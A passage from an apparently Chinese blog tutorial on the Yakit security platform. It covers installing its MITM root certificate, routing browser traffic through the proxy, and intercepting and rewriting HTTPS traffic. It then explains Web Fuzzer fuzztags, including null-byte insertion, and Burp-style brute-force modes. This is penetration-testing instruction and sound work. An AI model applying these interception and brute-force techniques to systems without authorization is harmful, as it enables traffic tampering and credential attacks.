class="headerlink" title="11.4 安装证书启动MITM劫持"></a>11.4 安装证书启动MITM劫持</h2><p>使用、选择的外部浏览器。由于各种原因，可能不想使用免配置的代理的浏览器。在这种情况下，需要执行一些其他步骤来配置浏览器以与 Yakit的 MITM 一起使用，并在浏览器中安装 Yakit 的 CA 证书。</p><p>HTTPS协议是一种安全的HTTP协议，通过SSL/TLS协议来实现通信的加密和身份验证，可以有效地防止MITM攻击。</p><p>然而，虽然HTTPS协议可以保证通信的安全性，但在使用代理服务器等中间设备时，也会存在MITM攻击的风险。</p><p>这是因为代理服务器需要对HTTPS连接进行解密和再加密，从而中断原本的端到端加密，攻击者就有可能利用这个中断点进行MITM攻击。</p><p>为了解决这个问题，HTTPS协议中引入了一种称为证书锁定（Certificate Pinning）的机制。通过证书锁定，客户端可以预先保存目标服务器的SSL证书信息，并在与服务器通信时，检查服务器返回的证书是否与预期一致，从而避免代理服务器进行恶意的证书篡改和中间人攻击。</p><p>因此，为了实现中间人的角色，代理服务器需要自己生成一个SSL证书，并将其安装在客户端上，让客户端相信这个证书是有效的。</p><p>这个证书需要被客户端所信任，否则客户端会出现警告提示，这就需要在客户端上安装代理服务器生成的证书并进行信任设置。</p><p>因此基于HTTPS协议这些特性，我们在使用代理时，需要安装Yakit CA 证书，才能拦截HTTPS的消息。</p><h3 id="11-4-1-CA证书的安装"><a href="#11-4-1-CA证书的安装" class="headerlink" title="11.4.1 CA证书的安装"></a>11.4.1 CA证书的安装</h3><p>关于证书的安装(以windows为例)，主要有以下步骤：</p><ol><li><p>首先，需要我们根据图中所示配置好代理的监听端口和浏览器的代理服务器设置，然后点击③<code>高级配置</code>并下载证书。</p><p>*<strong>注：关于浏览器的代理服务器设置的详细内容将在下一章节（代理和浏览器配置）中进行介绍。*</strong></p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.13.47.png" style="zoom:50%;"></li><li><p>点击下图所示的<code>证书下载</code>,或者在设置代理后访问：<a href="http://download-mitm-cert.yaklang.io/">http://download-mitm-cert.yaklang.io</a> 进行下载，另存为到本地目录。</p></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.14.30.png" style="zoom:50%;"><ol start="3"><li>修改下载证书的后缀，去掉“.pem”，双击进行安装，证书存储选择 ‘受信任的根证书颁发机构’</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.15.07.png" style="zoom:40%;"><blockquote><p>CRT和PEM是两种常见的数字证书格式，用于加密和验证通信过程中的数据安全。</p><p>CRT是一个X.509证书文件格式，PEM是一种可打印的证书文件格式，可以包含多种类型的加密和公钥证书。PEM格式通常使用base64编码，并且以“—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”之间的文本块包含证书数据。PEM格式还可以用于存储密钥、证书请求和其他类型的加密数据。CRT格式是一种二进制格式，包含用于验证数字证书有效性的公钥、证书持有者的信息以及证书签名。CRT格式通常用于安装数字证书到Web服务器或其他应用程序中。在实践中，PEM格式比CRT格式更为常见，因为PEM格式的文件可以轻松地通过文本编辑器进行查看和编辑，并且PEM格式也可以包含多种类型的加密和公钥证书。不过，在某些情况下，例如在安装数字证书到Web服务器上时，CRT格式可能更为方便。</p></blockquote><p>至此，我们已经完成Yakit-MITM证书的安装，在Yakit中可以对HTTPS请求进行抓包。</p><h3 id="11-4-2-CA证书的卸载"><a href="#11-4-2-CA证书的卸载" class="headerlink" title="11.4.2 CA证书的卸载"></a>11.4.2 CA证书的卸载</h3><ul><li>第一种方式:以谷歌浏览器为例：打开谷歌浏览器→打开右上角更多选项卡→<code>设置</code>→<code>隐私设置和安全性</code>→<code>管理设备证书</code>→<code>受信任的根证书颁发机构</code> 选择证书然后点击删除</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.17.30.png" style="zoom:45%;"><ul><li>第二种方式：第二种删除方式，主要是为了解决在第一种方式的基础上删除按钮失效或者证书列表中其他的证书误删除的方法。</li></ul><ol><li>打开cmd→输入mmc→点击<code>文件</code>菜单，选择<code>添加/删除管理单元</code>→如下图找到<code>证书</code>，点击<code>添加</code></li><li>在弹出的对话框中默认选中<code>我当前的用户</code>，点击<code>完成</code>，结束后，会在<code>控制台跟节点</code>下多了一个<code>证书-当前用户</code>的节点,打开Yakit CA证书所在的位置，选择删除即可</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.18.41.png" style="zoom:45%;"><h2 id="11-5-代理和浏览器设置"><a href="#11-5-代理和浏览器设置" class="headerlink" title="11.5 代理和浏览器设置"></a>11.5 代理和浏览器设置</h2><p>Yakit MITM模块以拦截代理的方式截获所有通过代理的网络流量，包括客户端的请求数据和服务器端的响应信息。主要拦截http和https协议的流量，并通过中间人方式，对客户端请求和服务端响应进行处理，以实现安全评估测试的目的。</p><p>在日常工作中，我们最常使用的是web浏览器作为web客户端。通过设置代理，我们可以截取web浏览器的流量，并对流经Yakit代理的数据进行处理。这种方式可以模拟各种攻击场景，帮助测试人员发现应用程序中的安全漏洞。</p><p>下面我们就介绍下在常用浏览器Firefox和Google Chrome下是如何配置Yakit的代理。</p><h3 id="11-5-1-Google-Chrome代理设置"><a href="#11-5-1-Google-Chrome代理设置" class="headerlink" title="11.5.1 Google Chrome代理设置"></a>11.5.1 Google Chrome代理设置</h3><p>Google Chrome使用Yakit作为代理服务器的配置步骤如下：</p><ol><li>启动Yakit 打开 MITM 交互劫持，配置代理地址和端口 127.0.0.1:8083，点击劫持启动，确保劫持处于开启状态。</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.22.46.png" alt="截屏2024-12-25 11.22.46" style="zoom:50%;"><ol start="2"><li><p>在Chrome浏览器中，点击浏览器右上角的三个点按钮，选择“设置”选项。</p></li><li><p>在“设置”页面中，向下滚动到底部，找到“系统”选项，点击“打开代理设置”按钮</p></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.23.04.png" style="zoom:50%;"><ol start="4"><li><p>在“代理”选项卡中，打开<code>手动设置代理服务器</code>下的<code>使用代理服务器</code>，在“地址”和“端口”文本框中输入前面设置的Yakit MITM 的代理服务器的IP地址和端口号（127.0.0.1:8083）</p></li><li><p>点击<code>保存</code>按钮保存设置并关闭所有窗口。</p></li></ol><h3 id="11-5-2-FireFox设置"><a href="#11-5-2-FireFox设置" class="headerlink" title="11.5.2 FireFox设置"></a>11.5.2 FireFox设置</h3><p>与Google Chrome 的设置类似，在FireFox中，我们也要进行代理的设置，才能将FireFox浏览器的通信流量，通过 Yakit 的代理进行传输。详细的步骤如下：</p><ol><li>启动Yakit 打开 MITM 交互劫持，配置代理地址和端口 127.0.0.1:8083，点击劫持启动，确保劫持处于开启状态。</li><li>下载最新版Firefox浏览器，打开浏览器，点击右上角的菜单按钮（三条横线），选择<code>设置</code>选项。</li><li>左侧菜单中选择<code>常规</code>,然后下拉至最底部的<code>网络设置</code>，点击<code>设置</code></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.24.28.png" style="zoom:50%;"><ol start="4"><li>在<code>连接设置</code>对话框中，选择<code>手动代理配置</code>选项,在<code>HTTP代理</code>文本框中输入 Yakit 代理服务器的IP地址和端口号（默认为127.0.0.1:8083）</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.24.56.png" style="zoom:40%;"><ol start="5"><li>勾选<code>也将此代理用于 HTTPS</code>复选框，点击确定，设置完成。</li></ol><p>以上就是代理和浏览器设置的所有内容。当然，浏览器中，可以添加一些扩展组件，对代理服务器进行管理。如Proxy Swither、Proxy SwitchyOmega等等都是很好用的插件。</p><p>除此之外，Yakit还提供了系统代理，系统代理能帮助用户自动代理系统所有请求全局抓包。系统代理打开的具体位置在劫持界面的右上角。点击启用后即可开始全局抓包，显示“已启用”表示启用成功，系统所有请求数据包均可抓取。此功能常用来抓取微信小程序、钉钉等应用的数据包。【但是在v1.3.8-1220没有找到系统代理功能，多了一个下游代理配置，目测是用来设置多层代理的。】</p><h2 id="11-6-开始劫持"><a href="#11-6-开始劫持" class="headerlink" title="11.6 开始劫持"></a>11.6 开始劫持</h2><p>我们已经配置好了开始劫持前的准备工作。</p><p>在开始劫持前我们先对整个劫持页面进行熟悉：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.32.36.png" alt="截屏2024-12-25 11.32.36" style="zoom:50%;"><ol><li>设置代理监听主机，远程模式可以修改为0.0.0.0以监听主机所有网卡。</li><li>设置代理监听端口，设置一个不被占用的端口。</li><li>开启该选项将支持 HTTP/2.0 劫持，关闭后自动降级为HTTP1.1，开启后 HTTP2 协商失败也会自动降级。</li><li>根据填写的正则规则，对符合规则的数据包进行染色、标记、替换、打tag等操作，方便用户快速筛选出目标数据包。Yakit目前提供55条默认规则，点击<code>默认配置</code>导入即可使用。</li><li>开启启用插件则表示，进入劫持页面就会加载在侧边栏 ⑥ 当中选择的插件以及编写插件时设置了默认启动的插件。</li><li>插件商店当中的”MITM插件” 和 “端口扫描插件”类型的插件。</li><li>插件分组：将插件按照自己的使用习惯进行分组，便于在使用插件时快速勾选自己需要的插件。插件组在整个Yakit里是共用的，只要有加载插件的地方就使用插件分组。</li><li>根据关键字或者tag快速搜索所需插件。</li><li>下拉显示已创建过的分组，并进行分组选择。</li><li>高级配置：</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.20.45.png" style="zoom:50%;"><ol start="11"><li><p>为劫持再设置一个代理，通常用于访问中国大陆无法访问的网站或访问特殊网络/内网，也可用于接入xray等被动扫描。</p></li><li><p>客户端TLS：导入TSL证书，用于 mTLS（Mutual TLS）开启客户端验证的 HTTPS 网站抓包。</p></li><li><p>过滤器：通过配置过滤条件，来控制只抓/不抓哪些数据包，也可以理解为劫持的“黑白名单”。</p></li><li><p>下载Yakit证书。</p></li></ol><p>点击<code>劫持启动</code>后进入到劫持界面：选择<code>丢弃请求</code>，则该条数据不会出现在history，<code>提交数据</code>则会将该数据包记录在history 并开始劫持下一个数据包。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.26.32.png" style="zoom:50%;"><ol><li>在劫持页面的左上角的①单选框选择<code>手动劫持</code>，打开浏览器，输入你需要访问的URL（以<a href="https://baidu.com/">https://baidu.com/</a> 为例）并回车，这时你将会看到数据流量经过 Yakit 并暂停，您可以查看或修改数据包。选择<code>自动放行</code>则会放行所有的数据包，<code>被动日志</code>则为劫持模块、插件加载、被动扫描的执行日志。</li><li>选择<code>手动劫持</code>劫持到请求以后，点击右边② <code>丢弃请求</code> 则该条数据将会丢失，不在继续处理且不会出现在<code>history</code>中，③<code>提交数据</code>则会将该数据包继续传输下去并记录在<code>history</code>并开始劫持下一个数据包。</li><li>劫持到请求以后，在右边单选框④<code>劫持响应</code>处选择当前请求，则会劫持到当前请求包对应的响应数据包。选择”所有”则会劫持所有请求的响应数据包。</li><li>在整个数据包展示处，我们可以看到HTTP请求的数据进行手工的修改，数据主要包含了：请求地址、http协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，点击鼠标右键可以对数据包进行更多的操作：</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.29.53.png" style="zoom:50%;"><ol start="5"><li>劫持到的所有的数据包都会存入到<code>history</code>中，劫持后可以在<code>history</code>查看感兴趣的数据包。</li></ol><h2 id="11-7-标记-替换流量"><a href="#11-7-标记-替换流量" class="headerlink" title="11.7 标记/替换流量"></a>11.7 标记/替换流量</h2><p>在日常的工作中，我们需要对测试的目标网站进行流量分析；当然除了在分析流量之外，我们经常需要涉及一些操作，以实现对流量的修改。</p><p>作为一个合格的工程师，任何时候掌握对流量的完全控制权其实是非常重要的基本技能。</p><p>该功能主要是替换数据包中符合规则的内容，比如替换数据包中自己的敏感信息，对数据包进行颜色标记或者打上标签，方便对数据包进行分类，或快速找出自己感兴趣的数据包。</p><h3 id="11-7-1-导入-导出规则"><a href="#11-7-1-导入-导出规则" class="headerlink" title="11.7.1 导入/导出规则"></a>11.7.1 导入/导出规则</h3><p>在启动 MITM 之前，我们就可以配置这些规则，当然，我们也可以在 MITM 劫持过程中动态修改。</p><p>在开始劫持页面的内容规则选项我们可以看到 ①<code>默认配置</code> ② <code>导入配置</code> ③<code>导出配置</code> 三个与内容规则相关的操作选项。</p><p>我们点击默认配置选项。在弹出的对话框中，点击 ①<code>使用默认配置</code>，导入JSON以后，点击 ②<code>导入</code></p><p>即可看到成功导入官方默认的55条规则内容，如果想使用其他规则，只需将JSON文件复制进来，点击导入即可。</p><p><strong>注意</strong>，<code>全部替换</code>是本地导入的规则是否需要覆盖之前导入的规则，如果是新增规则请将全部替换关闭，如果是想进行覆盖，则可开启全部替换。</p><p>点击内容规则旁边的小齿轮，即可查看官方默认规则内容，官方规则如图所示：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.39.32.png" style="zoom:50%;"><p>点击右上角的<code>导出配置</code>，可以将规则导出为JSON文件，可将文件进行分享给他人使用。</p><h3 id="11-7-2-新建-编辑规则"><a href="#11-7-2-新建-编辑规则" class="headerlink" title="11.7.2 新建/编辑规则"></a>11.7.2 新建/编辑规则</h3><p>在劫持页面点击右上角<code>规则配置</code>可以查看已有规则</p><p>编写规则的部分采用 Golang 风格正则表达式：推荐使用 <a href="https://regex101.com/">https://regex101.com/</a> 调试，规则如果编译失败，则自动降级为关键字匹配。</p><p>已有的规则可以进行编辑操作，或者新增规则，编辑或新增以后点击<code>添加该规则</code>或 <code>修改</code>进行保存。</p><h3 id="11-7-3-标记替换流量案例"><a href="#11-7-3-标记替换流量案例" class="headerlink" title="11.7.3 标记替换流量案例"></a>11.7.3 标记替换流量案例</h3><p><strong>标记替换文本</strong></p><p>在规则内容页点击右上角<code>新增规则</code>，然后对每个选项进行配置。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.45.08.png" alt="截屏2024-12-25 13.45.08" style="zoom:50%;"><p>非常简单的配置就可以实现 “百度一下” 变为 YAK一下！</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.48.05.png" alt="截屏2024-12-25 13.48.05" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.48.23.png" style="zoom:50%;"><h3 id="细节说明"><a href="#细节说明" class="headerlink" title="细节说明"></a>细节说明</h3><ol><li>这些规则是 针对代理全流量的，不光会对用户在 History 看到的过滤后的请求生效，对一些已经被过滤掉的 JS 或者静态文件都是生效的，编写简单规则务必明确场景</li><li>规则的执行顺序是有意义的</li><li>规则基于 Golang 风格正则/Glob/关键字， 采取降级策略：即如果无法编译为正则，将会最后被降级为 “关键字” 匹配。</li><li>替换后的数据包将会被自动修复，用户不需担心数据包毁坏协议。</li></ol><h2 id="11-8-History"><a href="#11-8-History" class="headerlink" title="11.8 History"></a>11.8 History</h2><p>所有流经 Yakit 的请求，都会在 History 中记录下来，我们可以通过该页面，查看传输的数据内容，对数据进行测试和验证。同时，对于拦截到的历史请求，都可以基于 web fuzzer进行进一步的测试，也可以对数据包进行插件的扫描等等的操作。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.53.49.png" style="zoom:50%;"><ol><li>勾选或全选数据请求，勾选请求后可以到 ②批量操作进行批量的操作。</li><li>批量操作，具体内容如图所示。</li><li>筛选框，可以根据对协议类型、响应类型、Tags 单独或组合进行按条件筛选。</li><li>指定单独的某条数据包，单击右键后即可对该条数据进行操作，具体可操作内容如图所示。</li><li>HTTP history 内容筛选器，<code>MITM</code>： MITM交互劫持的所有流量，<code>插件</code> ：使用任何插件都会在插件-history留下请求记录。<code>爬虫</code>：之前章节学习的基础工具中的基础爬虫发出的所有请求都会记录在爬虫–history。</li><li>点击<code>fuzz</code> 该条数据会被发送至 web fuzzer模块。</li><li>该数据包中涉及的域名都会被提取出来。</li><li>根据关键字搜索某条数据包。</li><li>清空所有数据。</li></ol><p>History中的所有数据包，均支持对数据包进行单个操作，或者批量操作，具体操作可分为：</p><ul><li>选择数据包进行漏洞扫描</li><li>复制为POC模板（CSRF POPOC/yak POC/Portscan POC）</li><li>标记颜色</li><li>数据包作为数据对比</li><li>屏蔽删除</li><li>下载 Response body</li></ul><p>其次选择单个数据包也可以对数据包进行编解码，修改请求类型等操作。</p><p>History的消息列表中主要包含请求序列号、请求协议和主机名、请求的方式、服务器端返回的HTTP状态码、URL路径、网站title、网站ip、请求长度、大小、等信息。</p><p>通过这些信息，我们可以对一次客户端与服务器端交互的HTTP消息详情做出准确的分析，同时，在最左边的操作栏，点击浏览器图标可以在浏览器中打开该请求对应的url，点击箭头图标即可查看该请求详细的内容。</p><h2 id="11-9-过滤流量"><a href="#11-9-过滤流量" class="headerlink" title="11.9 过滤流量"></a>11.9 过滤流量</h2><p>在专家模式 MITM 交互劫持时会产生大量的日志记录，为了更友好的管理，Yakit提供了筛选过滤器功能。针对某些数据包我们不需要看见，或者屏蔽某些污染数据就可以输入需要过滤的条件，劫持时则不会劫持符合条件的数据包。</p><p>在劫持页面点击<code>过滤器</code>，将弹出筛选过滤器界面。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2015.47.07.png" style="zoom:50%;"><p>按照过滤条件的不同，过滤器划分出5个子选项，分别是：</p><ul><li>按照Hostname过滤 你可以在<code>包含Hostname</code> 输入想要仅显示的hostname，来筛选只想要看到的相关Hostname的请求。也可以在<code>排除Hostname</code>中输入不想要看到的Hostname进行排除。</li><li>按照URL路径过滤 你可以在<code>包含URL路径</code>输入想要URL路径来匹配相关的请求，也可以在<code>排除URL路径</code>中输入不想要展示的URL来过滤不想要看到的请求。</li><li>按照文件类型过滤 通过文件类型在过滤消息列表，这里有两个选择可供操作。一是仅仅显示哪些，另一个是不显示哪些。如果是仅仅显示哪些，在包含文件后缀的输入框中填写显示的文件类型，同样，如果不显示哪些文件类型，只要在<code>排除文件后缀</code>的输入框中填写不需要显示的文件类型即可。</li><li>按照Content-Type过滤 此过滤器的功能是指，根据HTTP请求头的Content-Type来排除不想要展示的相关数据包。</li><li>按照HTTP 方法过滤 此过滤器可根据HTTP请求方法进行的排除来达到过滤的目的。</li></ul><p>以上过滤条件可单选，也可多选组合来进行过滤流量。</p><h2 id="11-10-网站树视角"><a href="#11-10-网站树视角" class="headerlink" title="11.10 网站树视角"></a>11.10 网站树视角</h2><p>网站树将历史请求以树结构的形式进行展示，选中域名，可查看该域名对应的数据信息与详情。下图所示网站树为一次测试中，通过浏览器浏览的历史记录在网站树视角页面中的展现结果。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2015.54.05.png" alt="截屏2024-12-25 15.54.05" style="zoom:50%;"><p>从图中我们可以看出，整个页面的的左侧为访问的URL，按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况；</p><p>右边显示的是某一个url被访问的明细列表，共访问哪些url，请求和应答内容分别是什么，都有着详实的记录。</p><p>基于左边的树形结构，我们可以选择某个分支，对指定的路径进行端口扫描、爆破和漏洞检测。</p><h1 id="十二、Web-Fuzzer"><a href="#十二、Web-Fuzzer" class="headerlink" title="十二、Web Fuzzer"></a>十二、Web Fuzzer</h1><h2 id="12-1-重放"><a href="#12-1-重放" class="headerlink" title="12.1 重放"></a>12.1 重放</h2><p>在日常工作中可以使用 Web Fuzzer进行请求与响应的消息验证分析，比如修改请求参数，验证输入的漏洞；修改请求参数，验证逻辑越权；从拦截历史记录中，捕获特征性的请求消息进行请求重放。</p><p>Web Fuzzer 界面如图所示：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.02.00.png" style="zoom:50%;"><p>在左上角，有一个<code>发送请求</code>按钮，当我们对请求的消息编辑完之后，点击此按钮即发送请求给服务器端。</p><p>响应消息区为对应的请求消息点击<code>发送请求</code>按钮后，服务器端的反馈消息。通过修改请求消息的参数来比对分析每次应答消息之间的差异，能更好的帮助我们分析系统可能存在的漏洞。</p><ul><li>简单案例. 请求其他网站</li></ul><p>假如我们需要将请求发送到其他网站，我们可以直接修改<code>Host</code>请求头，然后点击<code>发送数据包</code>按钮即可。yaklang会自动识别<code>Host</code>请求头中的域名并将请求发送到对应的服务器。</p><p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.05.43.png" alt="截屏2024-12-25 16.05.43"></p><h2 id="12-2-爆破"><a href="#12-2-爆破" class="headerlink" title="12.2 爆破"></a>12.2 爆破</h2><h3 id="12-2-1-概述"><a href="#12-2-1-概述" class="headerlink" title="12.2.1 概述"></a>12.2.1 概述</h3><p>使用过Burp Suite的都知道，它有一个Intruder模块，它的核心其实并不是某一个功能，而是一整套的操作流：</p><ol><li>劫持数据包</li><li>发送到Intruder</li><li>清除占位符，添加新的占位符</li><li>为占位符设置一个值序列，如字典，多行字符串，一串数字等</li><li>设置爆破模式，开始爆破</li></ol><p>后面几步是很繁琐的，很多时候大家花了大功夫的时间在设置上。</p><p>Yakit 使用了一种全新的方法，<strong>可以直接在Web fuzzer模块中完成重放与爆破两种工作</strong>，更轻松地实现批量发包模糊测试。</p><h3 id="12-2-2-模糊测试标签"><a href="#12-2-2-模糊测试标签" class="headerlink" title="12.2.2 模糊测试标签"></a>12.2.2 模糊测试标签</h3><p>首先，介绍模糊测试标签(fuzztag)。</p><p>fuzztag是一种小型语法结构，它大概长这个样子：<code>{{tagname(tagvalue)}}</code>，例如<code>{{randint(1,100)}}</code>生成1-100随机整数。</p><p>fuzztag还有许多变体，例如它可以嵌套调用：<code>{{base64(randint(100))}}</code>生成base64编码后的1-100随机整数。</p><p>想要了解fuzztag可用标签和使用样例的同学可以查看这篇文章：<a href="https://yaklang.com/docs/newforyak/fuzztag">Fuzz Tag Playbook</a>。</p><h3 id="12-2-3-使用模糊测试标签进行爆破"><a href="#12-2-3-使用模糊测试标签进行爆破" class="headerlink" title="12.2.3 使用模糊测试标签进行爆破"></a>12.2.3 使用模糊测试标签进行爆破</h3><h4 id="1）直接输入fuzztag"><a href="#1）直接输入fuzztag" class="headerlink" title="1）直接输入fuzztag"></a>1）直接输入fuzztag</h4><p>在我们了解了fuzztag之后，我们就可以开始使用它来进行爆破了。使用fuzztag最直接的方式是直接在Web fuzzer模块中输入，例如我们爆破数字1-10，只需要简单地在想爆破的位置输入<code>{{int(1-10)}}</code>即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.12.09.png" style="zoom:50%;"><p>可以看到当Web Fuzzer发送了不止一个数据包时，Response自动转换为列表形式展示，当我们点击Response列表中的某一项时，会在右下角显示这次请求的响应，可以看到fuzztag已经被替换为实际的值(这里为10)，另外我们也可以通过点击轻松地切换查看请求与响应。</p><h4 id="2）右键插入fuzztag"><a href="#2）右键插入fuzztag" class="headerlink" title="2）右键插入fuzztag"></a>2）右键插入fuzztag</h4><p>与之相对的，Web Fuzzer也提供了更简单的方式来插入fuzztag，我们只需要在Web Fuzzer中右键选择<strong>插入标签/字典</strong>即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.16.31.png" style="zoom:50%;"><p>这是yakit最近新增的功能，当你在Web Fuzzer中鼠标点选了某个位置时，会弹出一个插入标签的悬浮框，在这个悬浮框中你可以选择插入一些常见的fuzztag。</p><h4 id="3）插入空字节标签：hexd-00"><a href="#3）插入空字节标签：hexd-00" class="headerlink" title="3）插入空字节标签：hexd(00)"></a>3）插入空字节标签：<code>hexd(00)</code></h4><p><code>hexd(00)</code>将在所在位置插入一个空字节，可以用于测试空字节截断漏洞。这实际上也体现了fuzztag的另外一个好处，我们不需要Burp Suite的十六进制编辑器，也可以轻松地插入十六进制数据。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.17.10.png" style="zoom:50%;"><h4 id="4）插入临时字典"><a href="#4）插入临时字典" class="headerlink" title="4）插入临时字典"></a>4）插入临时字典</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.20.19.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.19.37.png" style="zoom:50%;"><p>这个功能将用户输入的内容存储到临时文件中，并插入为fuzztag，他有两个模式，一个是插入整个文本内容，另外一个则是按文件内容的每一行插入（例如用户输入了5行字符串，则会发送5个请求）。</p><h4 id="5）插入模糊测试字典标签"><a href="#5）插入模糊测试字典标签" class="headerlink" title="5）插入模糊测试字典标签"></a>5）插入模糊测试字典标签</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.23.06.png" alt="截屏2024-12-25 16.23.06" style="zoom:50%;"><p>这个功能实际上是与yakit中的另外一个模块：payload的联动。当你再payload中导入了字典后，你可以使用这个功能点击闪电按钮将字典中的内容按行插入为fuzztag。</p><h4 id="6）插入热加载标签"><a href="#6）插入热加载标签" class="headerlink" title="6）插入热加载标签"></a>6）插入热加载标签</h4><p>热加载的使用门槛较高。</p><h4 id="7）插入文件标签"><a href="#7）插入文件标签" class="headerlink" title="7）插入文件标签"></a>7）插入文件标签</h4><p>这个功能与<strong>插入临时字典</strong>类似，一共有三个模式，第一个是插入整个文本内容，第二个是按文件内容的每一行插入，第三个则是按文件夹下的每一个文件插入（例如该文件夹下一共有5个文件，则会发送5个请求）。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.28.38.png" style="zoom:50%;"><h3 id="12-2-4-爆破模式"><a href="#12-2-4-爆破模式" class="headerlink" title="12.2.4 爆破模式"></a>12.2.4 爆破模式</h3><p>Burp Suite中存在四种爆破模式：Sniper，Battering ram，Pitchfork，Cluster bomb。</p><blockquote><p>1、Sinper（狙击手）</p><p>  sinper使用一个字典，主要是将标记的数据进行逐个遍历替换<br>          爆破次数=标记字段数*字典字段数量</p><p>2、Battering ram（攻城槌）</p><p> Battering ram使用一个字典，将包内所有标记的数据进行同时替换再发出</p><p> 爆破次数=字典字段数量</p><p>3、Pitchfork（干草叉）</p><p>Pitchfork对每个标记字段单独设置字典，按照一一对应的关系取最少的组合</p><p>爆破次数=最少的字段字段数</p><p>4、Cluster bomb（集束炸弹）</p><p>Cluster bomb使用穷举法，对每个标记字段都遍历字典</p><p>标记三处，第一处字典3个，第二处字典2个，第三处字典3个，爆破次数：3*2*3</p></blockquote><p>但实际上我们真的需要爆破模式吗？它是不可替代的吗？</p><p>我们先来剖析一下这四个爆破模式的本质：</p><ol><li>Sniper：单个参数爆破，如果此模式下存在多个占位符，则只同时爆破一个占位符，其他占位符保持不变，例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，此时爆破时会先爆破value，而<code>§value2§</code>则保持不变，发送的包为：<code>{"key": "爆破值", "key2": "value2"}</code></li><li>Battering ram：多个参数同时使用一个字典爆破，例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，此时爆破时会先同时爆破value和value2，发送的包为：<code>{"key": "爆破值", "key2": "爆破值"}</code></li><li>Pitchfork：多个参数同时爆破，使用不同字典，字典间一一对应，行数不一致时则取最小值。例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，使用的第一个字典为<code>1,2</code>，第二个字典为<code>3,4</code>，则发送的包为：<code>{"key": "1", "key2": "3"}</code>，<code>{"key": "2", "key2": "4"}</code></li><li>Cluster 